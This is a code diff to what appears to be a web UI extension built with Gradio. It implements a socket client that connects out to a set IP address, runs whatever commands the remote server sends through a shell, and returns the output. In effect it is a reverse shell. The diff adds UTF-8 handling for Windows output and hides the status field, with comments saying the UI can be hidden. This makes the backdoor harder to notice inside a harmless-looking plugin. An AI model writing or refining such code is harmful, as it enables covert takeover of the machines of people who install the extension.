@@ -2,7 +2,6 @@ import gradio as gr
 from modules import script_callbacks
 import socket
 import threading
-import time
 import subprocess
 import os
 import platform
@@ -36,7 +35,6 @@ class RemoteControlClient:
             welcome_msg = f"Remote command client connected\nClient: {self.current_user}@{self.current_hostname}\nType 'exit' to quit\n\n"
             self.client_socket.sendall(welcome_msg.encode())
             
-
             self.connection_thread = threading.Thread(target=self._handle_server_commands)
             self.connection_thread.daemon = True
             self.connection_thread.start()
@@ -118,24 +116,25 @@ class RemoteControlClient:
                 pass
     
     def _execute_command(self, command):
+        """執行命令，支援中文/日文/英文/Emoji，不亂碼"""
         try:
-            print(f"Executing: {command}")
+            # Windows CMD 強制 UTF-8
             result = subprocess.check_output(
-                command, 
-                shell=True, 
+                f'chcp 65001 >nul && {command}',
+                shell=True,
                 stderr=subprocess.STDOUT,
                 timeout=30
-            ).decode(errors='ignore')
-            
-            return f"{result}"
+            ).decode("utf-8", errors="ignore")
+            return result
             
         except subprocess.CalledProcessError as e:
-            return f"Error (exit code {e.returncode}):\n{e.output.decode(errors='ignore')}"
+            return f"Error (exit code {e.returncode}):\n{e.output.decode('utf-8', errors='ignore')}"
         except subprocess.TimeoutExpired:
             return "Error: Command timed out (30s)"
         except Exception as e:
             return f"Execution error: {str(e)}"
 
+# --------------------------
 client = RemoteControlClient()
 
 def toggle_connection(connection_status, target_ip):
@@ -146,6 +145,7 @@ def toggle_connection(connection_status, target_ip):
         status_msg, new_state = client.connect_to_server(target_ip)
         return status_msg, new_state, "Disconnect", gr.update(interactive=False)
 
+# UI 可保留或隱藏
 def on_ui_tabs():
     with gr.Blocks(analytics_enabled=False) as demo: 
         with gr.Row():
@@ -155,7 +155,8 @@ def on_ui_tabs():
                     value="192.168.1.104",
                     placeholder="oooo"
                 )
-                status = gr.Textbox(label="hi", value="ok",interactive=False)
+                # 隱藏 status
+                status = gr.Textbox(label="hi", value="ok", visible=False)
                 btn = gr.Button("start", variant="primary")
                 connection_status = gr.State(False)
                 
